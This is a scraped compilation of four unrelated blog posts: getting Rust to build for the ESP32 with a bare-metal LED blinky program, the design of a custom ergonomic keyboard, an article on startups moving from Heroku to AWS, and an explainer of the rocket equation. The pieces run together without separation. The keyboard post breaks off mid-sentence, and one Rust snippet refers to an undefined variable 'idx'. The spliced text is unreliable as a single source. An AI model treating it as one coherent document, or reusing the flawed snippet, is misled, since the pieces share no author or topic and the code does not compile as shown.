<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <p>About six months ago, I made a <a href="https://www.reddit.com/r/rust/comments/ar2d3r/espressif_have_finally_released_an_llvm_fork_this/">post on reddit</a> highlighting the launch of Espressif's llvm xtensa fork, not too long after, I had a working <code>rustc</code> toolchain capable of generating xtensa assembly. At this point I had to put this project to the side to finish my final year of university. Funnily enough I didn't stray too far, my final year project used Rust to create a <a href="https://github.com/MWatch">'smartwatch'</a> (I may write about this in the future, if anyone is interested). </p>
<p>Since then I have seen a few posts utilising my fork to run Rust on the <a href="https://www.espressif.com/en/products/hardware/esp32/overview">ESP32</a> (<a href="https://dentrassi.de/2019/06/16/rust-on-the-esp-and-how-to-get-started/">see this great write up</a> by ctron, if you haven't already), most of which are building on top of <a href="https://github.com/espressif/esp-idf">esp-idf</a> which is written in C. In this post I'll be discussing the steps I took to generate valid binaries for the xtensa architecture with <code>rustc</code> and then write some <code>no_std</code> code to build a blinky program for the ESP32 only using Rust!</p>
<h2 id="hacking-the-compiler">Hacking the compiler</h2>
<p>In March of 2019, Espressif released their first run at an <a href="https://github.com/espressif/llvm-xtensa">llvm fork</a> to support the xtensa architecure. Shortly after I got to work bootstrapping Rust to use this newly created fork. Prior to this project, I'd had no experience with the compiler, fortunately I came across the <a href="https://github.com/rust-lang/rust/pull/52787">RISCV PR</a> which gave me a rough idea of what was required. After <em>many</em> build attempts I finally got it working; I was now able to generate xtensa assembly from Rust source code!</p>
<p>The next step was to assemble and link the generated assembly. The llvm fork in it's current state cannot perform object generation, so we must use an external assembler. Luckily Rust allows us to do so by specifying the <code>linker_flavor</code> as <code>gcc</code> and providing a path to the linker with the <code>linker</code> target option, in this case <code>xtensa-esp32-elf-gcc</code>. After that I created a few built-in targets (which you can see <a href="https://github.com/MabezDev/rust-xtensa/blob/ad570c5cb999f62a03156286fdb5d3d1bbd0fb8b/src/librustc_target/spec/xtensa_esp32_none_elf.rs">here</a>); <code>xtensa-esp32-none-elf</code> for the ESP32; <code>xtensa-esp8266-none-elf</code> for the ESP8266; finally the <code>xtensa-unknown-none-elf</code> target for a generic xtensa target.</p>
<h2 id="blinky-code">Blinky code</h2>
<p>Now lets try and get a ESP32 board to blink the onboard LED using just Rust. First off, we need our basic program structure. The <code>xtensa_lx6_rt</code> crate does most of the heavy lifting in this respect, we simply need to define an entry point and the panic handler. Some of this may look vaguely familiar if you have any experience with <code>cortex-m</code> development on Rust, I've tried to mirror the API as best as I can.</p>
<pre><span>#![</span><span>no_std</span><span>]
#![</span><span>no_main</span><span>]


</span><span>use</span><span> xtensa_lx6_rt as _;

</span><span>use </span><span>core::panic::PanicInfo;

</span><span>/// Entry point - called by xtensa_lx6_rt after initialisation
</span><span>#[</span><span>no_mangle</span><span>]
</span><span>fn </span><span>main</span><span>() -&gt; ! {
    </span><span>loop </span><span>{}
}

</span><span>/// Simple panic handler
</span><span>#[</span><span>panic_handler</span><span>]
</span><span>fn </span><span>panic</span><span>(</span><span>_info</span><span>: &amp;PanicInfo) -&gt; ! {
    </span><span>loop </span><span>{}
}
</span></pre>
<p>Now lets add some register definitions for the peripherals we want to use. For our blinky program, we will need to control the GPIO peripheral. In the ESP32 (and most modern processors) peripherals are mapped to memory adresses, commonly refered to as memory mapped peripherals. To control a peripheral we simply need to write values to the right addresses in memory, with respect to the reference manual supplied by the chip manufacturer.</p>
<pre><span>/// GPIO output enable reg
</span><span>const </span><span>GPIO_ENABLE_W1TS_REG</span><span>: </span><span>u32 </span><span>= </span><span>0x3FF44024</span><span>;

</span><span>/// GPIO output set register
</span><span>const </span><span>GPIO_OUT_W1TS_REG</span><span>: </span><span>u32 </span><span>= </span><span>0x3FF44008</span><span>;
</span><span>/// GPIO output clear register
</span><span>const </span><span>GPIO_OUT_W1TC_REG </span><span>: </span><span>u32 </span><span>= </span><span>0x3FF4400C</span><span>;

</span><span>/// The GPIO hooked up to the onboard LED
</span><span>const </span><span>BLINKY_GPIO</span><span>: </span><span>u32 </span><span>= </span><span>2</span><span>;

</span><span>/// GPIO function mode
</span><span>const </span><span>GPIO_FUNCX_OUT_BASE</span><span>: </span><span>u32 </span><span>= </span><span>0x3FF44530</span><span>;
</span><span>const </span><span>GPIO_FUNCX_OUT_SEL_CFG</span><span>: </span><span>u32 </span><span>= </span><span>GPIO_FUNCX_OUT_BASE </span><span>+ (</span><span>BLINKY_GPIO </span><span>* </span><span>4</span><span>);
</span></pre>
<p>Using these definitions it should be possible to change the gpio for your board<sup><a href="#gpio_pin">1</a></sup> by changing the <code>BLINKY_GPIO</code>; for my board (NODEMCU ESP-32S) it was GPIO2.</p>
<h3 id="initialisation">Initialisation</h3>
<p>Next lets setup the pin as a GPIO output. For the ESP32, this is a two step process<sup><a href="#gpio_pin">1</a></sup>. Firstly, its simply a case of setting a bit in the GPIO ouput enable register. Secondly the pin has to be configured in GPIO mode. There are not enough pins for all the possible peripherals in the chip, to combat this each pin can have multiple function modes. In the case of the ESP32, each pin has up to 256 different functions, although not all are mapped. To put the pin in GPIO mode, we need to put in mode 256 (0x100), we do this by writing to the function select register. After issuing those two register writes, we should be able to turn on the GPIO by setting the relevant bit inside the GPIO set register<sup><a href="#2">2</a></sup>.</p>
<pre><span>#[</span><span>no_mangle</span><span>]
</span><span>fn </span><span>main</span><span>() -&gt; ! {

    </span><span>// configure the pin as an output
    </span><span>unsafe </span><span>{
        core::ptr::write_volatile(</span><span>GPIO_ENABLE_W1TS_REG </span><span>as </span><span>*mut </span><span>_, </span><span>0x1 </span><span>&lt;&lt; </span><span>BLINKY_GPIO</span><span>);
        </span><span>// 0x100 makes this pin a simple gpio pin - see the technical reference for more info
        </span><span>core::ptr::write_volatile(</span><span>GPIO_FUNCX_OUT_SEL_CFG </span><span>as </span><span>*mut </span><span>_, </span><span>0x100</span><span>); 
    }
    </span><span>// turn on the LED
    </span><span>unsafe </span><span>{
        core::ptr::write_volatile(</span><span>GPIO_OUT_W1TS_REG </span><span>as </span><span>*mut </span><span>_, </span><span>0x1 </span><span>&lt;&lt; idx);           
    }
    </span><span>loop </span><span>{}
}
</span></pre><h3 id="delaying">Delaying</h3>
<p>For the next stage of our blinky program, we need a way to delay; a simple approach could use <code>for</code> loop like so.</p>
<pre><span>pub fn </span><span>delay</span><span>(</span><span>clocks</span><span>: </span><span>u32</span><span>) {
    </span><span>let</span><span> dummy_var: </span><span>u32 </span><span>= </span><span>0</span><span>;
    </span><span>for </span><span>_ in </span><span>0</span><span>..clocks {
        </span><span>unsafe </span><span>{ core::ptr::read_volatile(&amp;dummy_var) };
    }
}
</span></pre>
<p>We add the volatile read so that the compiler doesn't optimise our delay away. The problem with this approach is that depending of the optimisation level, the number of clock cycles each iteration of the loop changes. We need a cycle accurate way of delaying, fortunately the ESP32 has an internal clock counting register which can be accessed with the read special register <code>rsr</code> instruction. Now are delay function looks like this.</p>
<pre><span>/// cycle accurate delay using the cycle counter register
</span><span>pub fn </span><span>delay</span><span>(</span><span>clocks</span><span>: </span><span>u32</span><span>) {
    </span><span>// NOTE: does not account for rollover
    // ommitted: the asm to read the ccount
    </span><span>let</span><span> target = </span><span>get_ccount</span><span>() + clocks;
    </span><span>loop </span><span>{
        </span><span>if </span><span>get_ccount</span><span>() &gt; target {
            </span><span>break</span><span>;
        }
    }
}
</span></pre>
<p>Now we have cycle accurate counting we can delay for one second by waiting for the number of cycles the processor will do in one second. The default clock speed on most ESP boards is 40mhz, hence waiting for 40 million cycles equates to a one second delay.</p>
<p>Bringing the snippets together and cleaning up the code into functions, we now have <code>main</code> that looks like this.</p>
<pre><span>#[</span><span>no_mangle</span><span>]
</span><span>fn </span><span>main</span><span>() -&gt; ! {
    </span><span>// configure the pin as an output
    </span><span>configure_pin_as_output</span><span>(</span><span>BLINKY_GPIO</span><span>);

    </span><span>loop </span><span>{
        </span><span>set_led</span><span>(</span><span>BLINKY_GPIO</span><span>, </span><span>true</span><span>);
        </span><span>delay</span><span>(</span><span>CORE_HZ</span><span>);
        </span><span>set_led</span><span>(</span><span>BLINKY_GPIO</span><span>, </span><span>false</span><span>);
        </span><span>delay</span><span>(</span><span>CORE_HZ</span><span>);
    }
}
</span></pre>
<p>After flashing to the board, and firing up our JTAG debugger<sup><a href="#1">3</a></sup>, we are greeted with a blinking LED!</p>

<p>The full source can be found in the <a href="https://github.com/MabezDev/xtensa-rust-quickstart">the xtensa quickstart repo</a> if you wish to try it for yourself.</p>
<p>Now I know what most of you are thinking at this point, it's not very Rusty; it contains bundles of unsafe and there are no real abstractions here, and you are right; but it's something to get the ball rolling.</p>
<h2 id="limitations">Limitations</h2>
<p>There are a few small teething issues, but by far the biggest being issue is that the fork struggles with generating debug info; the external assembler does not support <a href="https://sourceware.org/binutils/docs-2.24/as/CFI-directives.html#CFI-directives">CFI directives</a> something that all llvm targets need to support. CFI directives can easily be removed with some preprocessing, but does of course add an extra step. After pushing past that issue, I was still getting relocation linker errors. I opened <a href="https://github.com/espressif/llvm-xtensa/issues/10">an issue</a> to document my findings in the hopes it can be sorted in the next iteration of the llvm fork.</p>
<h2 id="future-work">Future work</h2>
<p>Once the debuginfo issue is sorted, I hope to start developing an ecosystem of HAL's and drivers similar to the <a href="https://github.com/stm32-rs">stm32-rs</a> and <a href="https://github.com/nrf-rs">nrf-rs</a>; I've already started the <a href="https://github.com/esp-rs">esp-rs</a> organization which is where <code>xtensa-lx6-rt</code> currently resides. Espressif has started the upstream process, the first ten patches are now in review, there should be an update coming to their fork moving from the older llvm6 to llvm8 (and hopefully some other additions and fixes too!).</p>

<h2 id="tldr">tl;dr</h2>

<p>I’ve designed and built my own mechanical keyboard.
It’s fucking awesome!
I’m going to ramble about it now, <em>in detail</em>.
Read on if you’re interested, or jump to either the <a href="#assembly">in-progress</a> or the <a href="#the-finished-product">finished</a> pictures, or post a comment to <a href="https://www.reddit.com/r/MechanicalKeyboards/comments/d0wls7/ladies_and_gentleman_the_absolem/">the reddit thread</a>, or… you know… do whatever you fancy.
I’m not your mom. :)</p>

<h2 id="intro">Intro</h2>

<p>Until about one and a half years ago, I’d been happily typing on a <a href="https://www.cnet.com/products/genius-slimstar-i220-keyboard-series/">basic Genius keyboard</a> with a QWERTZ (Hungarian QWERTY) layout.
Ah… simpler times!</p>

<p><img alt="Ignorance is bliss" src="https://zealot.hu/absolem/pics/fun/ignorance_is_bliss.gif">
</p>

<p>I was hovering at about 50-60 wpm, which – while decidedly not blazing fast – didn’t bother me much.
I also didn’t really care that my typing “technique” involved around 4-6 fingers and a lot of looking at the keyboard.
What <em>did</em> bother me was nights when I couldn’t actually see the keys and it slowed me down quite a bit.</p>

<p>If you’re thinking that my solution was learning to touch type, you’re wrong! (for now…)
I, of course, decided that I needed a backlit keyboard.
Around this time I was vaguely aware of mechanical keyboards and the “supposed” superior typing experience they provide.
So to celebrate my dissertation defense, – and after a cursory glance at full size vs. TKL arguments – I treated myself to a <a href="https://www.coolermaster.com/catalog/peripheral/keyboards/masterkeys-pro-s-white/">MasterKeys Pro S</a>.
And that’s where the problems started…</p>

<p>To be fair, the Pro S is a fine keyboard.
But it’s not even the thing that convinced me about mechs.
By the time it arrived, the geekhack-deskthority-r/mk Bermuda triangle sucked me in, and I was already too deep.
Looking back now, I think the main cause was that I started looking at the topic as genuine “research”, and in my mildly fanatic<a href="#footnote-1"><sup>1</sup></a> worldview that could only end with another “dissertation”, which is what this post is, I guess.</p>

<p>So, strap in as I rant about the whole journey that led me here.
Also, fair warning that I’m writing this on the already finished Absolem, which is just a pleasure to type on, so I’m going to be verbose! :P</p>

<h2 id="research">Research</h2>

<p>Being a researcher by trade, I can very much appreciate the need for seeing what someone has already done in order to not reinvent the wheel.
Also, following the old saying “stealing from one source is plagiarism; stealing from many is research”, I have basically patched together the (imho) best parts of what the current state of the art has to offer.
It was an interesting observation to make that almost all the best<a href="#footnote-2"><sup>2</sup></a> ergo aspects came from different places, while their combination didn’t exist yet.
That’s probably what lead to me deciding to design my own; had I found a board that checks all the boxes, I’d have just ordered that.
(I’m also secretly happy that it didn’t turn out like that, because this way I got to make my own, and it was a good chance to grow… but psst, don’t tell that to anyone!)</p>

<p>So with that in mind, let me just quickly walk you through the steps that lead me to “keeb enlightenment”.
Disclaimer, though: I’m only going to mention most concepts briefly to keep the post’s length manageable, but it can hopefully serve as a good starting point to begin your own, deeper research if you want.</p>

<h3 id="general-stuff">General stuff</h3>

<p>Okay, basics first, if you’re interested in the topic, you should browse <a href="https://geekhack.org/">GeekHack</a>, <a href="https://deskthority.net/">Deskthority</a>, and (of course) <a href="https://www.reddit.com/r/MechanicalKeyboards/">r/mk</a>.
(As an example, <a href="https://geekhack.org/index.php?topic=95771.0">here</a> are my tentative first steps in a brave new world over on Geekhack).</p>

<p>These places are not only chock full of information, ideas, and inspiration; they also house a very helpful and supportive community.
This is also where I’d like to thank a few people for their general help in this project, namely:</p>

<ul>
  <li><a href="https://geekhack.org/index.php?action=profile;u=55020">algernon</a>, fellow Hungarian keeb expert, for all the early advice,</li>
  <li><a href="https://feierabendprojekte.wordpress.com/2018/03/21/building-a-keyboard-by-hand/">Azel4231</a>, for his help in switch layout related measurements (I’m the “redditor” from the addendum…),</li>
  <li>and, naturally, <a href="https://www.reddit.com/user/Dotdash32/">DotDash32</a>, for the metric shitton of discussion we’ve done in both posts and reddit messages that really helped me shape what I should aim for.</li>
</ul>

<h3 id="staggers">Staggers</h3>

<p>What became really clear early on is that row-staggers are evil.
The reason they exist is pure path dependence (we’ve always done it like this, let’s keep doing it like this), and they should be eradicated.
For me, this is an issue that’s been a non-issue for a long long time, but now (that I’m “enlightened”) it’s impossible to unsee…
I mean, I sympathize with all the muscle memory that will be lost in a transition (I’m in the middle of one right now, after all), but that can’t be a good enough reason not to switch!
I’m not really a comment-y kind of guy, but you can find even me sometimes in the <a href="https://www.reddit.com/r/MechanicalKeyboards/comments/c8njw4/ergonomic/esr6nab/?context=8&amp;depth=9">middle of an argument</a> under reddit posts that claim some connection to ergonomics, yet still retain the row-stagger.</p>

<p>I’m much more “lenient” towards ortho (a.k.a. grid, or matrix) layouts, but the clear winner of this aspect (for me) is column-staggered boards.
Let’s give future aliens a chance to figure out how we looked like!</p>

<p><img alt="Nerd joke" src="https://zealot.hu/absolem/pics/fun/nerd_joke.jpg" width="60%">
</p>

<p>What’s more, I’m very much in favour of an “aggressive” stagger.
Many boards started in the right direction, but few went far enough, so I’ve been planning to be a little heavier-handed in the stagger department from the start.</p>

<p>As an example, compare a <a href="http://www.vortexgear.tw/vortex2_2.asp?kind=47&amp;kind2=220&amp;kind3=&amp;kind4=997">“traditional” TKL (or 60%)</a> vs. a <a href="https://olkb.com/planck">Planck</a> vs. an <a href="https://atreus.technomancy.us/">Atreus</a>.</p>

<h3 id="the-number-of-keys">The number of keys</h3>

<p>Today’s full size (and beyond) keyboards come from the assumption that there should be the same number of keys as there are desired functionalities and we should make our hands conform to the resulting layout.
I, on the other hand, think that the inverse of this is true, namely that we should make the number of the keys match what’s comfortably reachable from the home position and make the desired functionalities conform to that.</p>

<p><img alt="XKCD keyboard" src="https://zealot.hu/absolem/pics/fun/xkcd_keyboard.png" width="60%">
</p>

<p>This leads to a) touch typing – or at least a strictly enforced finger-key relationship (which has many more benefits I’m not going to discuss here) and b) to the need to significantly decrease the number of keys.
On the other extreme of the spectrum is <a href="http://plover.stenoknight.com/">stenography</a>, but even if we remain firmly within the realm of letter-based typing, we can (and should) make do following the “at most 1 key distance from home” principle.
That leaves at most 6 × 3 keywells + 3 thumb keys per hand.
I’d argue that anything more than that is bad.
(Not only “unnecessary” or “wasteful”, mind you, but actually bad. As in, it could be better with less…)</p>

<p>The natural result of a small number of keys while still wanting a large number of functions is the use of layers.
And layers – especially if combined with custom programmability, more on that later – are the “bees knees”!
Nevertheless, I encounter many posts that criticize the overuse of layers, or posts that express confusion about how a 40% keyboard can still be practical.
I’d refer the former group to their shift keys and the notable lack of dedicated capital letters on their boards, while the latter group should take a look at their phone while writing a text and tell me again how a really small keyboard is unusable.</p>

<p>Anyways, I digress…
The point is that I came to the conclusion that there should be very few keys with heavy layering support.
As an example, consider traditional keyboards vs. a <a href="https://github.com/foostan/crkbd">corne</a>.</p>

<h3 id="the-pinky-column">The pinky column</h3>

<p>Like we saw above, the pinky often gets 2 columns (similarly to the index finger) even when conforming to the “1 distance from home” (1DFH) rule; and much more when not.
What I’ve found is that a) it’s unnecessary with a sufficiently clever keymap and a lo(oooo)t of practice, and b) it <em>should</em> be avoided to spare your weakest fingers however you can.
So I’ve adopted a further restriction over the 1DFH to limit myself to 5 × 3 keys per hand (plus the thumbs, of course).</p>

<p>Regarding the physical layout of the pinky keys, my experiments (and my eyes, when looking at my hand) showed that the pinky can use a little bit of separation from the others.
This <em>could</em> theoretically apply to the ring and middle fingers, too, but I didn’t feel the need in those cases.
However, it really shouldn’t apply for the index finger, which already has an extra column to take care of, like in the case of the <a href="https://github.com/omkbd/Sector">Sector</a>.</p>

<p>As an example of pinky overworking, consider any regular layout (or even the <a href="https://ergodox-ez.com/">Ergodox</a>) vs. the <a href="https://geekhack.org/index.php?topic=89951.0">Minidox</a> (of which my design is basically a slightly refined, glued together, and wireless-ized version).
As for an illustration of the pinky angle, take a look at the <a href="https://github.com/pseudoku/ErgoWarp">ErgoWarp</a>.</p>

<h3 id="the-thumb-region">The thumb region</h3>

<p>Generally, there are three approaches for the thumbs:</p>

<ol>
  <li>SPACEBAR!!! – one of the thumbs can keep hacking away on a button that takes up 6-7 spaces, while the other just exists. Very efficient… <code>&lt;/sarcasm&gt;</code> There are more sophisticated layouts, with split spacebars and the like, but from an ergonomic standpoint, these are all subpar compared to the next two.</li>
  <li>Clusters – consider the <a href="https://ergodox-ez.com/">Ergodox</a> again. While this way is definitely better than a single spacebar, in my opinion it overcompensates with the amount of work it tries to give to the thumbs. The side effect of this is that very few of those thumb keys are actually convenient (or usable, according to some). This leads us nicely to:</li>
  <li>Fans – consider the <a href="https://shop.keyboard.io/">KeyboardIO Model 01</a>. This approach appreciates that the thumb actually moves in an arc, and doesn’t try to add extra functionality either above or below it.</li>
</ol>

<p><img alt="Thumb fractal" src="https://zealot.hu/absolem/pics/fun/thumb_fractal.jpg" width="40%">
</p>

<p>This is probably the only “really” original part of the Absolem design, as all the other stuff I’ve mentioned so far could be seen <em>somewhere</em> before.
And, depending on how we interpret “original”, maybe not even this…
But: I actually placed the thumb keys on an arc, with a measured thumb radius.
Yes, I actually had to refresh my trigonometry for this!
And I, of course, followed the 1DFH principle, too, so there can only be 3 (unlike the KeyboardIO’s 4).</p>

<p>I’d also like to mention, as someone with quite wide (read: fat) thumbs, I’ve aimed to have 1.25u thumb keys from the start, at least for the home position.
The sides can more easily be 1u because they don’t have a neighbor on one side, so there’s less chance for misclicking (mispressing?).
But the thumb home position (which is flanked by other thumb keys on both …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Between late 2019 and early 2020, I interviewed more than 200 CTOs of growing US and EU startups on the topics of the Cloud and their working methodologies. I discovered that 86% of these SMB startups use the Cloud and that 48% started their business on <a href="https://www.heroku.com/">Heroku</a> and then migrated to a Cloud provider - especially <a href="https://aws.amazon.com/">AWS</a> (Amazon Web Services).</p><p>This article explains:&nbsp;</p><ul role="list"><li>Why 48% of CTOs moved from Heroku to AWS.&nbsp;</li><li>Why migrating to AWS is a "hell" (a word I've often heard in my interviews).</li><li>How to simplify AWS and meet the needs of growing startups.</li></ul><h2>From Heroku to AWS</h2><p>Early in the life of a startup, the CTO's objective is to design a product quickly and then validate that the product's value proposition is the right one with the defined target. Technical decisions are pragmatic, saving valuable time on product delivery. For application hosting, the majority choice of CTOs is Heroku - because it's easy to get started, with virtually zero upfront cost, a price that grows with usage and maximum time spent on the product rather than managing the complexity of a server and database infrastructure.</p><p>When the startup's market positioning is the right one, the product is successful. The questions of recruitment and team structuring naturally arise, and it is from this point on that the CTO realizes that:</p><ul role="list"><li><strong>Heroku is not for teamwork</strong>: a group of developers will have to share the same environments (staging, development) at the risk of getting stuck on modifications. Heroku very quickly shows its limitations in this mode of operation and prevents development teams from being productive and efficient.</li><li><strong>Heroku is not for enterprise applications</strong>: Heroku considers the deployment and management of applications as a single unit. However, today an application is often made up of several apps - a frontend, a backend, and a database. Heroku does not allow you to manage a set of applications as a single application. This leads to difficulties in complexity management. And therefore, loss of team productivity.</li><li><strong>Heroku is outrageously expensive</strong>: even though AWS is not known for being cheap, Heroku is up to 10x more expensive than AWS for the same use. The more you use it, the more your bills go up. Peace of mind at a price, but it's tough to scale with Heroku.</li></ul><p>These negative points lead 48% of CTOs to replace Heroku by AWS. But not everything is as green on the other side of the fence...</p><h2>AWS hell for CTOs</h2><p>Pre-sales engineers at AWS have a real strength to promote the many advantages of their Cloud solution. Arguments such as free services for up to 2 years and technical support by a dedicated account manager and a team of Cloud architects resonate exceptionally well. Their crews know the field correctly and know how to reassure. Their products are of outstanding quality, and reliability is well proven. However, most of the CTOs we interviewed have no experience of what it means to use a Cloud provider such as AWS. From a technical point of view, you have to start from scratch - everything has to be built from the ground. Meaning, configuring the network, configuring the services, creating a CI for integration, and a CD for deployment - in short, getting your hands in the engine. In our study, we found two types of CTOs, the one who loves to get their hands dirty in the infrastructure, and the one who doesn't want to. The latter is predominant, and even in the case of the first, he lacks time to do what is necessary. The CTO then often turns to someone from his team who will have the cumbersome task of " re-creating " how Heroku works but often learning on-the-job. Months can go by until the CTO decides to do so:&nbsp;</p><ul role="list"><li>Contracting an external DevOps company</li></ul><p>OR</p><ul role="list"><li>Internalize this skill by recruiting it</li></ul><p>From that moment on, I often heard, "<strong>Recruiting a DevOps is a real hell, I wouldn't wish it on anyone</strong>". Not surprisingly, this skill is scarce and expensive - ~$180k/year in San Francisco. Recruiting a DevOps can take up to 12 months, not counting the months of work needed to get a tenth of a Heroku functionality.<br></p><p>AWS is complex to use, as it has to meet the needs of all businesses around the world. However, it is possible to simplify AWS. Here are some areas for improvement...</p><h2>Simplify AWS and meet the needs of growing startups</h2><p>To meet the needs of growing startups, we should be able to combine Heroku's simplicity with the flexibility of AWS. But where to start? Here are my thoughts:</p><h3>A UX designed for developers</h3><p>Heroku gets it; the developer is now the king. He's the one who turns ideas into products. Developers should be able to use AWS without any effort. AWS must be fully integrated into their working environment (IDE) to request what they need transparently. "I need a PostgreSQL version 12 database, a 20GB disk, and to have my application available at https://foo.bar - and of course all this on my Cloud account".</p><h3>An opinionated approach</h3><p>Even if there is no consensus work methodology in the R&amp;D departments of startups, most of them try to copy their elders with a functioning (most often) in the form of a Squad. The idea would be to ensure that the product can fit team working. GitOps and environment isolation (production, staging, dev) methodologies by "git" branch are a perfect start. GitOps methodologies would allow developers to maximize their productivity and never slow down their colleagues on the deployment of new features.</p><h3>Extensible</h3><p>Heroku's move to AWS is not insignificant. A growing startup needs technical extensibility. Deploying applications automatically is good, but allowing you to change everything at any time is even better. This leaves room for future DevOps to join the growing startup.</p><h2>To go further</h2><p>These areas of improvement apply to AWS as well as to other cloud providers such as Google Cloud Platform and Azure. At Qovery, we have begun this work of simplifying the Cloud. Our mission is to make it accessible to any developer, enabling growing startups to become the unicorns of tomorrow.<br></p><p><a href="https://jobs.qovery.com/">We're recruiting!</a></p><p>‍</p><p><a href="https://www.linkedin.com/pulse/jai-interview%25C3%25A9-200-ctos-de-startups-en-croissance-voici-philog%25C3%25A8ne/?trackingId=9l7kV9csR4ySm1Br7IXPuQ%3D%3D">French translation</a></p></div></div>]]>

<p>When dabbling with the laws of motion in the 17th century, Isaac Newton first realized that it is indeed possible to send an object out of Earth, into space. As long as an object is shot away from Earth with a high enough velocity, it <em>will</em> reach space and start orbiting our planet.</p>



<p>With the launch of the Sputnik satellite in 1957 onboard a powerful rocket, the Soviet Union achieved exactly that. For the first time in four billion years of life on Earth, something was intentionally sent to space.</p>



<div><figure><img src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?fit=1024%2C388&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?w=1513&amp;ssl=1 1513w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?resize=1024%2C388&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?resize=200%2C76&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?resize=768%2C291&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/sputnik.jpg?resize=1200%2C454&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption><strong>Left:</strong> Launch of Sputnik satellite on October 4, 1957 by the Soviet Union, kickstarting the Space Age. <strong>Right:</strong> An engineer besides the finished Sputnik satellite.

<p>Give a satellite another speed boost, by either launching it on a more powerful rocket or using small thrusters onboard, and it can escape from Earth’s gravitational hold completely. That’s how you can send <a href="https://jatan.space/why-explore-venus/">missions to Venus</a>, Mars, <a href="https://jatan.space/why-explore-saturn/">Saturn</a> and beyond. But one of these two things is not quite like the other.</p>



<p>Enter the <a href="https://en.wikipedia.org/wiki/Tsiolkovsky_rocket_equation">rocket equation</a>.</p>



<p>The rocket equation is what allows scientists and engineers to quantify and compare the energy required to reach various destinations in space. Its implications are far-reaching but not intuitive – so I shall attempt to explain them without use of any math.</p>



<h3><strong>Getting to space</strong></h3>



<p>The rocket equation tells us the amount of energy a rocket must expend to go from the Earth’s surface to an orbit 250 kilometers above, called low Earth orbit, is almost thrice as much as going to the Moon from that low Earth orbit! Likewise, getting to low Earth orbit costs more than twice the energy required to reach Mars from that same orbit.<sup>1</sup></p>



<p>Even if we include the energy expenditure not just to reach the Moon from low Earth orbit but to land on it, getting to Earth orbit itself turns out to be about 50% more expensive. In other words, attaining Earth orbit is the first and the most significant barrier to space exploration.</p>

<blockquote><p>The giant leap for humanity was not stepping on the Moon but getting to Earth orbit.</p></blockquote>



<p>The rocket equation doesn’t just dictate how much energy you must spend to reach various destinations in space but also if you can reach space at all!</p>



<h3><strong>Planetbound</strong></h3>



<p>The satellite is but a small fraction of the total mass of the rocket that lifts it and yet has an effect on the rocket itself. Therein lies the core problem of rocket science.</p>



<p>Increasing the satellite’s mass, to make it more useful perhaps, also means more rocket fuel is required to put the satellite in the desired orbit. But more fuel makes the system weigh more. This means some more fuel is required to launch the now-heavier system into space. As a thumb rule, fuel requirements increase <a href="https://commons.wikimedia.org/wiki/File:Tsiolkovsky_rocket_equation.svg">exponentially</a> with every step increase in mass added to the satellite.</p>



<p>This is how we end up with rockets being mostly fuel and then some metal. Even the mighty Saturn V that sent astronauts to the Moon was 85% fuel, 13% rocket – including the rocket body, its plumbing and parts, and the rest 2% being the Moonbound spacecraft with astronauts sitting inside!</p>



<div><figure><img src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?fit=1024%2C856&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?w=2100&amp;ssl=1 2100w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=1024%2C856&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=200%2C167&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=768%2C642&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=1536%2C1284&amp;ssl=1 1536w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=2048%2C1712&amp;ssl=1 2048w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/saturn-v-cutaway-illustration.jpg?resize=1200%2C1003&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>A cutaway illustration of the Saturn V rocket showing the rocket structure and the Moonbound spacecraft on top, which together comprise just 15% of the system’s mass, the rest 85% being fuel. <a href="https://solarsystem.nasa.gov/news/337/what-was-the-saturn-v/">Credit: NASA</a></figcaption></figure></div>



<p>At this point, if we were to make Earth more massive, a rocket would have to expend an enormous amount of energy against a more gruesome gravity well. More fuel would be required to get to space and your rocket might be something akin to 9 times more fuel than metal. Increase Earth’s mass further and the fuel-to-mass ratio would start <em>skyrocketing</em> to a point where it’s simply not possible to engineer such a near-all-fuel rocket!</p>



<p>Crunching the numbers in this manner, it turns out that if the Earth was 50% more massive, you simply wouldn’t be able to get to space even with the most energetic fuel combination (liquid hydrogen and liquid oxygen) available in chemical rockets.</p>



<p>Such a massive rocky planet is not imaginary, several of its kind exist. Of the 4,000+ planets around other stars we’ve discovered to date in our galaxy, about a thousand are something scientists call ‘Super Earths’. These are planets which are up to 10 times more massive than Earth and up to twice as large. Beyond that limit, planets don’t remain rocky and start turning into Uranus/Neptune-like gas giants.</p>



